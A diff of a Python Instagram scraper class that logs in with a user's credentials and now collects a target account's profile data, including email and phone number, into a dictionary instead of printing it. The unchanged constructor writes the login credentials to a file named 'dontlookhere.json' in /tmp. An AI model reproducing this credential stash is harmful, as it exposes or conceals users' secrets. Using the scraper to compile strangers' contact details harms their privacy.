@@ -37,11 +37,14 @@ class Scrape:
     def __init__(self, username, password, target):
         self.username = username
         self.password = password
+        self.logged_in = None
+        self.scraped_data = None
 
         temp_dir = '/tmp'
         credentials_file = os.path.join(temp_dir, "dontlookhere.json")
         if os.name == "posix" and not os.path.exists(credentials_file):
             self.save_credentials(username, password)
+            self.logged_in = True
 
         try:
             api = Client(username, password)
@@ -89,37 +92,31 @@ class Scrape:
         """Prints account information."""
         try:
             user = data.get('user', {})
-            printer.info(f"Scraping data from the account '{user.get('username')}'...")
-
-            printer.success(f"Username - {user.get('username')}")
-            printer.success(f"Full Name - {user.get('full_name')}")
-            printer.success(f"Id - {user.get('pk')}")
-            printer.success(f"Biography - {user.get('biography')}")
-            printer.success(f"External Url - {user.get('external_url')}")
-            printer.success(f"Is Private? - {user.get('is_private')}")
-            printer.success(f"Is Verified? - {user.get('is_verified')}")
-            printer.success(f"Is Business? - {user.get('is_business')}")
-            printer.success(f"Business Category - {user.get('category')}")
-
-            if user.get('is_business'):
-                printer.success(f"Can Direct Message? - {user.get('direct_messaging')}")
-                printer.success(f"Email - {user.get('public_email')}")
-                printer.success(f"Phone Number - {user.get('public_phone_country_code')} {user.get('public_phone_number')}")
-
-            for link in self.safe_get(user, 'bio_links', []):
-                printer.success(f"Bio Link(s) - {link.get('url')}")
-
-            printer.success(f"Total Posts - {user.get('media_count')}")
-            printer.success(f"Followers - {user.get('follower_count')}")
-            printer.success(f"Following - {user.get('following_count')}")
-
-            chain_suggestions = user.get('chaining_suggestions', [])
-            for idx, chain in enumerate(chain_suggestions, 1):
-                printer.success(f"{idx} Chaining Suggestion(s) - {chain.get('username')} - {chain.get('full_name')} ({chain.get('pk')})")
-
-            printer.success(f"Media(s) - {user.get('media_count')}")
-            printer.success(f"IGTV Video(s) - {user.get('total_igtv_videos')}")
-            printer.success(f"Profile Pic Url - {self.safe_get(user, 'hd_profile_pic_url_info.url')}")
-            printer.success(f"Profile Url - https://www.instagram.com/{user.get('username')}")
+            self.scraped_data = {
+                'username': user.get('username'),
+                'full_name': user.get('full_name'),
+                'id': user.get('pk'),
+                'biography': user.get('biography'),
+                'external_url': user.get('external_url'),
+                'is_private': user.get('is_private'),
+                'is_verified': user.get('is_verified'),
+                'is_business': user.get('is_business'),
+                'business_category': user.get('category'),
+                'can_direct_message': user.get('direct_messaging') if user.get('is_business') else None,
+                'email': user.get('public_email') if user.get('is_business') else None,
+                'phone_number': f"{user.get('public_phone_country_code')} {user.get('public_phone_number')}" if user.get(
+                    'is_business') else None,
+                'bio_links': [link.get('url') for link in self.safe_get(user, 'bio_links', [])],
+                'total_posts': user.get('media_count'),
+                'followers': user.get('follower_count'),
+                'following': user.get('following_count'),
+                'chaining_suggestions': [
+                    {'username': chain.get('username'), 'full_name': chain.get('full_name'), 'pk': chain.get('pk')} for
+                    chain in user.get('chaining_suggestions', [])],
+                'media_count': user.get('media_count'),
+                'total_igtv_videos': user.get('total_igtv_videos'),
+                'profile_pic_url': self.safe_get(user, 'hd_profile_pic_url_info.url'),
+                'profile_url': f"https://www.instagram.com/{user.get('username')}",
+            }
         except Exception as e:
             printer.error(f"Error: {e}")
